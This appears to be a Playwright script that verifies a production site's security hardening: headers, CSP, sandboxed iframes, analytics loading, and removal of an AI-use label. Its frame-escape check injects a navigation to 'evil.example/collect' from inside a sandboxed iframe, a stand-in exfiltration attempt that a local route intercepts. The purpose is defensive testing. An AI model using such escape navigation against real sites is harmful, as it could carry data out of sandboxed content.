// 本番の URL で、T022 の終わりの条件を確かめる（docs/tasks/T022.md「5」）。npm test には入れない（本番に要求を送るため）。
// node scripts/verify-t022.mjs
//
// - ヘッダーの表が、本番でも e2e/harden.spec.ts と同じこと（HTML、API、エラー、転送、アセット、HEAD、枠、www の転送）。
// - 本物の作品の枠で、別名の location で外へ移ろうとしても、外へ届かないこと（Chromium、WebKit）。宛先は route で受け、本当には送らない。
// - GA4 は送り先（collect）を止めた上で、gtag.js の読み込みが親の CSP で壊れていないこと。親の CSP の違反が0のこと。
// - FIX-no-ai が本番に残っていること。
//
// 閲覧数を増やさない（CLAUDE.md 原則10）：POST /api/count は止める。GA4 に閲覧を送らない（docs/tasks/T016.md「2.5」）。
import { chromium, webkit } from '@playwright/test';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const shots = join(dirname(fileURLToPath(import.meta.url)), '../../../docs/screens');
const PROD = 'https://ludion.ai';
const WORKERS_DEV = 'https://ludion-web.ludion.workers.dev';
const WWW = 'https://www.ludion.ai';
const USER_AGENT = 'ludion-verify-t022';
const HSTS = 'max-age=604800';
const REFERRER = 'strict-origin-when-cross-origin';
const PARENT_CSP = "frame-src 'self'; frame-ancestors 'none'; base-uri 'none'; object-src 'none'";
const FRAME_CSP =
  "sandbox allow-scripts allow-forms; form-action 'none'; default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com data:; img-src data: blob:; frame-ancestors 'self'";
const DENIED_FEATURES = ['camera', 'microphone', 'geolocation', 'payment', 'usb', 'serial', 'bluetooth', 'hid', 'display-capture'];
/** GA4 の送り先。gtag.js（www.googletagmanager.com）は読ませる */
const GA_SINKS = /(^|\.)google-analytics\.com$|(^|\.)analytics\.google\.com$/;
const NO_GA_SINKS = '--host-resolver-rules=MAP *.google-analytics.com 127.0.0.1:9, MAP *.analytics.google.com 127.0.0.1:9, MAP analytics.google.com 127.0.0.1:9';

let failed = 0;
function check(name, ok, detail = '') {
  if (!ok) failed += 1;
  console.log(`${ok ? '満たした' : '未達　　'} ${name}${detail ? `：${detail}` : ''}`);
}

const get = (url, init = {}) => fetch(url, { redirect: 'manual', ...init, headers: { 'User-Agent': USER_AGENT, ...init.headers } });

function headerProblems(headers, kind) {
  const problems = [];
  const want = (name, value) => {
    if (headers.get(name) !== value) problems.push(`${name}=${headers.get(name)}`);
  };
  want('x-content-type-options', 'nosniff');
  want('strict-transport-security', HSTS);
  if (kind === 'other') {
    want('content-security-policy', null);
    want('referrer-policy', null);
    want('permissions-policy', null);
    return problems;
  }
  want('content-security-policy', kind === 'frame' ? FRAME_CSP : PARENT_CSP);
  want('referrer-policy', REFERRER);
  const denied = (headers.get('permissions-policy') ?? '').split(/,\s*/);
  for (const feature of DENIED_FEATURES) if (!denied.includes(`${feature}=()`)) problems.push(`${feature} が拒否されていない`);
  if (denied.join().includes('clipboard-write')) problems.push('clipboard-write を止めている');
  return problems;
}

async function checkHeaderTable(work, html) {
  const script = /src="(\/assets\/index-[^"]+\.js)"/.exec(html)[1];
  const frame = `/frame/${work.id}/${work.version}/desktop.html`;
  const rows = [
    ['HTML /', '/', {}, 200, 'html'],
    ['HTML /?c=web', '/?c=web', {}, 200, 'html'],
    ['HTML 作品のページ', `/p/${work.id}`, {}, 200, 'html'],
    ['HTML 作り手のページ', `/c/${work.creator.handle}`, {}, 200, 'html'],
    ['HTML /privacy', '/privacy', {}, 200, 'html'],
    ['HTML /about', '/about', {}, 200, 'html'],
    ['HTML 404', '/no-such-path-t022', {}, 404, 'html'],
    ['HTML ない作品', '/p/no-such-work-t022', {}, 404, 'html'],
    ['HEAD /', '/', { method: 'HEAD' }, 200, 'html'],
    ['HEAD 作品のページ', `/p/${work.id}`, { method: 'HEAD' }, 200, 'html'],
    ['枠', frame, { headers: { 'Sec-Fetch-Dest': 'iframe' } }, 200, 'frame'],
    ['枠の外から（転送）', frame, {}, 302, 'other'],
    ['転送 /saved', '/saved', {}, 302, 'other'],
    ['転送 /auth/github', '/auth/github', {}, 302, 'other'],
    ['API /api/works', '/api/works', {}, 200, 'other'],
    ['API /api/me', '/api/me', {}, 200, 'other'],
    ['API の 404', '/api/no-such-t022', {}, 404, 'other'],
    ['API のエラー（トークンなし）', '/api/admin/works', { method: 'POST' }, 401, 'other'],
    ['HEAD API', '/api/works', { method: 'HEAD' }, 200, 'other'],
    ['アセット', script, {}, 200, 'other'],
    ['画像', `/w/${work.id}/${work.version}/thumb.webp`, {}, 200, 'other'],
    ['robots.txt', '/robots.txt', {}, 200, 'other'],
    ['sitemap.xml', '/sitemap.xml', {}, 200, 'other'],
  ];
  for (const [label, path, init, status, kind] of rows) {
    const response = await get(`${PROD}${path}`, init);
    await response.arrayBuffer();
    const problems = headerProblems(response.headers, kind);
    check(`${label} ${path}`, response.status === status && problems.length === 0, `${response.status}（${kind}）${problems.length ? ` 問題：${problems.join('、')}` : ''}`);
  }

  const dev = await get(`${WORKERS_DEV}/p/${work.id}`);
  await dev.arrayBuffer();
  const devProblems = headerProblems(dev.headers, 'html');
  check('workers.dev の作品のページも同じ', dev.status === 200 && devProblems.length === 0, `${dev.status} ${devProblems.join('、')}`);

  const www = await get(`${WWW}/p/${work.id}?a=1`);
  await www.arrayBuffer();
  check(
    'www の転送',
    www.status === 301 && www.headers.get('location') === `${PROD}/p/${work.id}?a=1` && www.headers.get('x-content-type-options') === 'nosniff' && www.headers.get('strict-transport-security') === HSTS,
    `${www.status}、${www.headers.get('location')}、nosniff=${www.headers.get('x-content-type-options')}、HSTS=${www.headers.get('strict-transport-security')}`,
  );
}

async function checkSearchLimit() {
  const response = await get(`${PROD}/?q=${'t022'.repeat(1000)}`);
  const html = await response.text();
  check('長い q はエラーにせず切る', response.status === 200 && !html.includes(`value="${'t022'.repeat(51)}`), `${response.status}、${html.length} 文字`);
}

/** 自分のサイトと GA4 のほかへの要求を受け止める。ここに来たら「届いた」。 */
async function watchOutside(context) {
  const seen = [];
  const outside = (url) => /^https?:$/.test(url.protocol) && url.hostname === 'evil.example';
  context.on('request', (request) => {
    if (outside(new URL(request.url()))) seen.push(request.url());
  });
  await context.route(outside, (route) => route.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><title>outside</title>' }));
  return seen;
}

/** 本物の作品の枠の中で、別名の location で外へ移ろうとする（SEC001 の R1）。作品は変えず、その場の枠の中でだけ試す。 */
async function checkEscape(browser, label, work) {
  const context = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const seen = await watchOutside(context);
  const page = await context.newPage();
  await page.route('**/api/count', (route) => route.abort());
  // Chromium は launch で送り先を止める。WebKit は gtag.js ごと止める（verify-prod.mjs と同じ）
  if (label !== 'chromium') await page.route(/googletagmanager\.com|google-analytics\.com|analytics\.google\.com/, (route) => route.abort());
  await page.goto(`${PROD}/p/${work.id}`, { waitUntil: 'load' });
  const part = page.frameLocator('iframe').locator(`[data-ld-part="${work.id}"]`);
  await part.waitFor({ state: 'attached', timeout: 15_000 });
  const frame = page.frames().find((candidate) => candidate !== page.mainFrame());
  await frame.evaluate(`const l = location; l.href = 'https://evil.example/collect?v=ld-synthetic-input';`).catch(() => {});
  await page.waitForTimeout(2500);
  await part.waitFor({ state: 'attached', timeout: 15_000 });
  check(`${label} /p/${work.id}：枠を外へ移そうとしても届かず、作品は枠に戻る`, seen.length === 0 && new URL(page.url()).pathname === `/p/${work.id}`, `届いた ${seen.length} 回、親は ${new URL(page.url()).pathname}`);
  await context.close();
}

/** 本物の gtag.js を読む（送り先だけ止める）。親の CSP の違反がないこと。 */
async function checkAnalyticsLoads(browser, work) {
  for (const path of ['/', `/p/${work.id}`, '/about']) {
    const context = await browser.newContext();
    const page = await context.newPage();
    await page.addInitScript(() => {
      if (window !== window.top) return;
      window.__violations = [];
      document.addEventListener('securitypolicyviolation', (event) => window.__violations.push(`${event.effectiveDirective} ${event.blockedURI}`));
    });
    await page.route('**/api/count', (route) => route.abort());
    const sinks = [];
    await page.route((url) => GA_SINKS.test(url.hostname), (route) => {
      sinks.push(new URL(route.request().url()).hostname);
      return route.abort();
    });
    const errors = [];
    page.on('pageerror', (error) => errors.push(error.message));
    const gtag = page.waitForResponse((response) => response.url().includes('googletagmanager.com/gtag/js'), { timeout: 15_000 });
    await page.goto(`${PROD}${path}`, { waitUntil: 'load' });
    const gtagStatus = (await gtag).status();
    await page.waitForFunction(() => typeof window.google_tag_manager === 'object' || Array.isArray(window.dataLayer), null, { timeout: 15_000 });
    await page.waitForTimeout(1500);
    const violations = await page.evaluate(() => window.__violations);
    check(`gtag.js ${path}`, gtagStatus === 200 && violations.length === 0 && errors.length === 0, `gtag.js ${gtagStatus}、親の CSP の違反 ${violations.length}${violations.length ? `（${violations.join('、')}）` : ''}、ページのエラー ${errors.length}、送り先への試み（止めた）${sinks.length} 回`);
    await context.close();
  }
}

/**
 * FIX-no-ai が本番に残っていること（CLAUDE.md 原則9。11/9 の決定）。
 * T022 の最初のデプロイは、FIX-no-ai を含まない枝から出して、この表示を本番に戻してしまった。
 */
async function checkNoAi(browser) {
  const id = 'login-lumen';
  const html = await (await get(`${PROD}/p/${id}`)).text();
  const api = await (await get(`${PROD}/api/works`)).text();
  const banned = /made_with|ai-assisted|AIを使い/;
  check(`/p/${id} の HTML に作り方の表示とデータがない`, !banned.test(html), `一致 ${(html.match(new RegExp(banned, 'g')) ?? []).length} 件`);
  check('/api/works に made_with がない', !banned.test(api), `一致 ${(api.match(new RegExp(banned, 'g')) ?? []).length} 件`);

  for (const [width, height] of [[1440, 900], [390, 844]]) {
    const context = await browser.newContext({ viewport: { width, height } });
    const page = await context.newPage();
    await page.route('**/api/count', (route) => route.abort());
    await page.goto(`${PROD}/p/${id}`, { waitUntil: 'load' });
    await page.getByRole('heading', { level: 1 }).waitFor();
    const text = await page.evaluate(() => document.body.innerText);
    const xLinks = await page.locator('a[href*="x.com/"]').all();
    const xLabels = await Promise.all(xLinks.map((link) => link.innerText()));
    check(`/p/${id} 幅${width}：画面に AI の一行がなく、X のリンクが文字の「X」でない`, !/AIを使い|AI を使い/.test(text) && xLabels.every((label) => label.trim() !== 'X'), `X のリンク ${xLinks.length} 個、文字 ${JSON.stringify(xLabels.map((label) => label.trim()))}`);
    await page.screenshot({ path: join(shots, `t022-prod-work-${width}.png`) });
    await context.close();
  }
}

const browsers = { chromium: await chromium.launch({ args: [NO_GA_SINKS] }), webkit: await webkit.launch() };
try {
  await checkNoAi(browsers.chromium);
  const { works } = await (await get(`${PROD}/api/works`)).json();
  const [work] = works;
  const html = await (await get(`${PROD}/`)).text();
  await checkHeaderTable(work, html);
  await checkSearchLimit();
  for (const [label, browser] of Object.entries(browsers)) await checkEscape(browser, label, work);
  await checkAnalyticsLoads(browsers.chromium, work);
} finally {
  await Promise.all(Object.values(browsers).map((browser) => browser.close()));
}

console.log(failed === 0 ? '\n全部満たした' : `\n未達 ${failed} 件`);
process.exit(failed === 0 ? 0 : 1);
